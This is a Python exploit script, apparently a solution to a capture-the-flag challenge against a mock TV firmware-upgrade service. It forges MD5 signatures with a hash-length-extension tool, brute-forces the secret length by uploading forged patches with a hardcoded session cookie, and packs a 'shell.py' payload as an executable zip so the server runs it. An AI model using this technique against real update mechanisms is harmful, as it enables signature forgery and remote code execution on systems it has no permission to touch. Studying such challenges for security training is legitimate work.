import shutil
import sys
import os
import zipfile
from pprint import pprint

import requests
import subprocess

HOST="https://t-tvlink-cz7nt56c.spbctf.net"
cookie= {"session": "eyJhdXRoIjogdHJ1ZX0=.Zill-Q.V9xMcbWC3g6Iedn6JTAIeDWuqts"}

def zip_directory(directory, zip_file_name):
    # Ensure the directory exists
    if not os.path.exists(directory):
        raise FileNotFoundError(f"Directory '{directory}' does not exist.")

    # Ensure the directory is actually a directory
    if not os.path.isdir(directory):
        raise NotADirectoryError(f"'{directory}' is not a directory.")

    # Create a ZipFile object in write mode
    with zipfile.ZipFile(zip_file_name, 'w') as zipf:
        # Iterate over all the files and subdirectories in the directory
        for root, dirs, files in os.walk(directory):
            for file in files:
                # Get the full path of the file
                file_path = os.path.join(root, file)
                # Get the relative path of the file within the directory
                relative_path = os.path.relpath(file_path, directory)
                # Add the file to the zip file with its relative path
                zipf.write(file_path, relative_path)

def create_patch_zip():
    # Example usage
    directory_to_zip = 'new-patch'
    zip_file_name = 'new-patch.zip'
    # os.remove('new-patch.zip')
    zip_directory(directory_to_zip, zip_file_name)

def create_patch(length=10, append_filename='shell.py', target_filename: str= 'upgrade.py'):
    shutil.rmtree("new-patch", ignore_errors=True)
    os.mkdir("new-patch")
    process = subprocess.Popen(
        ["../../../Tools/Crypto/hash_extender/hash_extender", # change this to your path to hash_extender
         "--file", "tvlink-firmware_345b8e0/upgrade.py",
         "-s", open("tvlink-firmware_345b8e0/signature.txt", 'r').read().strip(),
         "-l", str(length),
         "-f", "md5",
         "--appendfile", append_filename,
         "--out-data-format=raw",
         "-q"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, stderr = process.communicate()
    print("CREATE PATCH ERRORS", stderr)
    signature = stdout[:32]
    result_content = stdout[32:]
    open('new-patch/signature.txt', 'wb').write(signature + b"\n")
    open("new-patch/" + target_filename, 'wb').write(result_content)

def bruteforce_secret_length():
    for i in range(1, 64):
        print(f"Trying secret length {i}")
        create_patch(i)
        create_patch_zip()
        response = send_patch()
        if response.status_code != 500:
            print("Signature valid with length", i)
            pprint(response.headers)
            print(response.content.decode())
            break

def zip_in_zip():
    with zipfile.ZipFile('execute.zip', 'w') as zipf:
        # zipf.write('new-patch/signature.txt', 'signature.txt')
        zipf.write('shell.py', '__main__.py')

def send_patch(filename: str = 'new-patch.zip'):
    file = open(filename, 'rb')
    files = {'firmware': file}
    r = requests.post(HOST + "/UPGRADE.XHTML", files=files, cookies=cookie)
    file.close()
    return r

if __name__ == '__main__':
    if sys.argv[1] == 'create-patch':
        create_patch(int(sys.argv[2]))
    elif sys.argv[1] == 'bruteforce':
        bruteforce_secret_length()
    elif sys.argv[1] == 'zip-in-zip':
        zip_in_zip()
        create_patch(int(sys.argv[2]), "execute.zip", 'execute.zip')
        create_patch_zip()
        resp = send_patch()
        print(resp.content.decode())



